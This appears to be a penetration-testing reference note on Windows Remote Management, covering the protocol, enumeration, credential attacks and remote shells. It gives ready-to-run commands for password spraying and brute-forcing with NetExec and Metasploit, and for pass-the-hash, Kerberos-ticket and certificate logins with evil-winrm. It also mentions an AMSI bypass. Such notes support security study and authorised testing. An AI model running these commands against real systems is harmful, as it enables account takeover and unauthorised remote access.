---
created: 2026-09-22
updated: 2026-10-11
tags:
  - services_n_protocols
---
>[!note] See [[Privileged remote access]].
## WinRM

>**[Windows Remote Management (WinRM)](https://learn.microsoft.com/en-us/windows/win32/winrm/portal)** is Microsoft's implementation of the DMTF WS-Management (WS-Man) protocol, a SOAP-based standard for exchanging management information across IT infrastructure over HTTP(S).

- WinRM exposes an HTTP-based interface to WMI operations, and it provides the underlying transport for remote command execution, configuration management, and PowerShell Remoting on Windows systems.
- It is best understood as the Windows equivalent of SSH for administrators: it is built into every Windows Server release since 2008 R2 and is used heavily by sysadmins, automation frameworks (Ansible, Chef, Puppet), and DevOps pipelines.
- WinRM follows a **client-server model**:
	- The **client** issues management requests as SOAP messages over HTTP or HTTPS.
	- The **server** listens on the WinRM ports, authenticates the caller, and services the request through the WS-Man stack.

>**WS-Management (WS-Man)** is a DMTF standard that specifies a SOAP-based protocol for managing devices, applications, and web services. It defines a common way to access and exchange management information across different vendor implementations using standard HTTP/HTTPS transport.

>[!important] By default, WinRM listens on **TCP port `5985`** for HTTP and on **TCP port `5986`** for HTTPS.

- WinRM supports several authentication schemes, including `Negotiate` (NTLM/Kerberos), Kerberos, Basic, and `CredSSP`.
- Over HTTP on port `5985`, credentials are not sent in plaintext — `Negotiate` still hashes them — but the absence of TLS leaves the SOAP payload (commands, output, transferred files) unencrypted and capturable by a man-in-the-middle. The HTTPS listener on port `5986` wraps the connection in TLS.

>[!important] To establish WinRM sessions, a user must be a member of the **`Remote Management Users`** or **`Administrators`** group.

>[!interesting]+ WinRM connection process
> 
> 1. The client sends an HTTP `POST` to `/wsman` (for example, `http://10.10.11.5:5985/wsman`).
> 2. The server responds with `401 Unauthorized` and a `WWW-Authenticate` header advertising the supported authentication schemes (NTLM, Kerberos, and so on).
> 3. The client performs authentication negotiation (for example, an NTLM challenge-response or a Kerberos ticket exchange).
> 4. Once authenticated, a WinRM **shell** resource is created (`ResourceURI: http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd`).
> 5. Commands are issued as SOAP messages (`<rsp:CommandLine>`), and responses return as XML.
> 6. PowerShell Remoting (`PSRemoting`) layers the **PowerShell Remoting Protocol (PSRP)** on top of WS-Man and serializes full .NET objects rather than plain text, which is why `Enter-PSSession` gives a richer experience than a raw shell.
>
>>[!note] On the target, each `PSRemoting` session is handled by a dedicated `wsmprovhost.exe` process.

### WinRM ports

| Port       | Protocol      | Description                                                                                     |
| ---------- | ------------- | ---------------------------------------------------------------------------------------------- |
| `5985/tcp` | WinRM (HTTP)  | **Default HTTP listener** used by `Negotiate`-authenticated clients; the SOAP payload is unencrypted. |
| `5986/tcp` | WinRM (HTTPS) | **TLS listener** that wraps the WS-Man traffic in HTTPS.                                        |

>[!note]- Legacy WinRM ports
> Before Windows 7 / Server 2008, WinRM defaulted to the HTTP-compatible ports `80` and `443`. Modern installations use `5985` and `5986`; the legacy ports are still occasionally seen on older or manually configured hosts.


## Enumerating WinRM

### Port scanning and version detection

- Perform service version detection on the default WinRM ports:

```bash
sudo nmap -sV -p 5985,5986 10.10.11.5
```

>[!tip]+
> - Scan the full TCP range with version detection in case WinRM is bound to a non-standard port:
> 
> ```bash
> sudo nmap -sV -p- 10.10.11.5
> ```

- Run version detection together with the default NSE scripts:

```bash
sudo nmap -sV -sC -p 5985,5986 10.10.11.5
```

| Option     | Description                                                     |
| :--------- | :------------------------------------------------------------- |
| `-sV`      | Enable service version detection.                             |
| `-sC`      | Run the default NSE script set.                               |
| `-p`       | Specify destination port(s) to scan (`5985,5986` or `-p-`).   |

>[!note] WinRM exposes an HTTP endpoint, so an open `5985`/`5986` port is often reported as `http`/`https` (frequently `Microsoft HTTPAPI httpd`). Confirm the service by probing the `/wsman` endpoint rather than relying on the banner alone.

### Testing whether WinRM is enabled

- Probe the `/wsman` endpoint and confirm the WS-Man listener responds using NetExec:

```bash
nxc winrm 10.10.11.5 -u '' -p ''
```

- Verify the remote WinRM service responds from a Windows host:

```powershell
Test-WSMan -ComputerName 10.10.11.5
```

>[!note] `Test-WSMan` returns the WS-Man protocol version and stack details without authentication, which confirms the listener is live before any credentials are attempted.

## Brute-forcing credentials

- Once the listener is confirmed, WinRM credentials can be sprayed or brute-forced; because a successful login yields command execution, this is often the fastest path from a wordlist to a shell.

- Spray a single password across a list of usernames using NetExec:

```bash
nxc winrm 10.10.11.5 -u usernames.txt -p 'passwd123' --no-bruteforce
```

- Brute-force the password for a single user using NetExec:

```bash
nxc winrm 10.10.11.5 -u jdoe -p /usr/share/wordlists/rockyou.txt
```

- Brute-force credentials using Metasploit:

```bash
msfconsole -q -x "use auxiliary/scanner/winrm/winrm_login; set rhosts 10.10.11.5; set user_file usernames.txt; set pass_file /usr/share/wordlists/rockyou.txt; run; exit"
```

| Option            | Description                                                                  |
| :---------------- | :-------------------------------------------------------------------------- |
| `-u`              | Set a single username or a wordlist file (NetExec).                          |
| `-p`              | Set a single password or a wordlist file (NetExec).                          |
| `--no-bruteforce` | Pair each username with the matching password line instead of every combination (password spraying). |
| `--local-auth`    | Authenticate against the local account store rather than the domain (NetExec). |

>[!note] A NetExec login flagged `(Pwn3d!)` indicates the account is a local administrator on the target, meaning the credentials grant not just a shell but privileged remote execution.

>[!warning] Domain accounts are subject to lockout policies. Keep spraying measured — one password against many users, spaced out — to avoid locking accounts and generating noise.

## Connecting to WinRM

>[!note] See [[Privileged remote access#WinRM]] for the complete client reference, including native PowerShell Remoting (`Enter-PSSession`, `Invoke-Command`) and NetExec command execution.

- `evil-winrm` is the primary tool for interacting with WinRM from Linux. It supports plaintext passwords, NT hashes, Kerberos tickets, and client certificates, and it adds file upload/download, in-memory script and binary loading, and an AMSI bypass on top of the raw shell.

- Authenticate using a password:

```bash
evil-winrm -i 10.10.11.5 -u jdoe -p 'passwd123'
```

- Authenticate using an NT hash ([[Pass-the-Hash]]):

```bash
evil-winrm -i 10.10.11.5 -u jdoe -H 2b576acfd5e0c865136732c44b49b6b1
```

- Connect over the HTTPS listener on port `5986`:

```bash
evil-winrm -i 10.10.11.5 -u jdoe -p 'passwd123' -S
```

- Authenticate using a client certificate and private key:

```bash
evil-winrm -i 10.10.11.5 -u jdoe -S -c cert.pem -k key.pem
```

| Option | Description                                                              |
| :----- | :---------------------------------------------------------------------- |
| `-i`   | Target IP address or FQDN.                                              |
| `-u`   | Username for authentication.                                            |
| `-p`   | Plaintext password.                                                     |
| `-H`   | NT hash to use for authentication (Pass-the-Hash).                      |
| `-r`   | Kerberos realm or domain name (enables Kerberos authentication).        |
| `-S`   | Enable SSL/TLS transport on the HTTPS listener (port `5986`).           |
| `-c`   | Path to the client certificate for certificate-based authentication.   |
| `-k`   | Path to the private key corresponding to the client certificate.       |

### Kerberos authentication

- In domain environments, WinRM accepts Kerberos tickets ([[Pass-the-Ticket]]).

- Point `KRB5CCNAME` at the credential cache holding the ticket:

```bash
export KRB5CCNAME=/path/to/ticket.ccache
```

- Connect using the hostname (Kerberos requires the name, not the IP address) and specify the realm:

```bash
evil-winrm -i dc01.example.com -u jdoe -r example.com
```

>[!tip]+ If name resolution fails, map the hostname locally:
> ```bash
> echo "10.10.11.5 dc01.example.com" >> /etc/hosts
> ```

### Transferring files within a session

- Upload a local file to the remote host from within the `evil-winrm` shell:

```bash
upload /path/to/local/file.exe C:\Windows\Temp\file.exe
```

- Download a file from the remote host:

```bash
download C:\Windows\Temp\output.txt /tmp/output.txt
```

>[!note] Without a destination path, `download` writes the file to the current local directory.

## References and further reading

- [`Windows Remote Management — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/winrm/portal)
- [`WS-Management Protocol — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol)
- [`evil-winrm — GitHub`](https://github.com/Hackplayers/evil-winrm)
- [`NetExec — GitHub`](https://github.com/Pennyw0rth/NetExec)
- [`5985,5986 - Pentesting WinRM — HackTricks`](https://hacktricks.wiki/en/network-services-pentesting/5985-5986-pentesting-winrm.html)
- [`WinRM Penetration Testing — Hacking Articles`](https://www.hackingarticles.in/winrm-penetration-testing/)
- [`WinRM (Windows Remote Management) — Hackviser`](https://hackviser.com/tactics/pentesting/services/winrm)
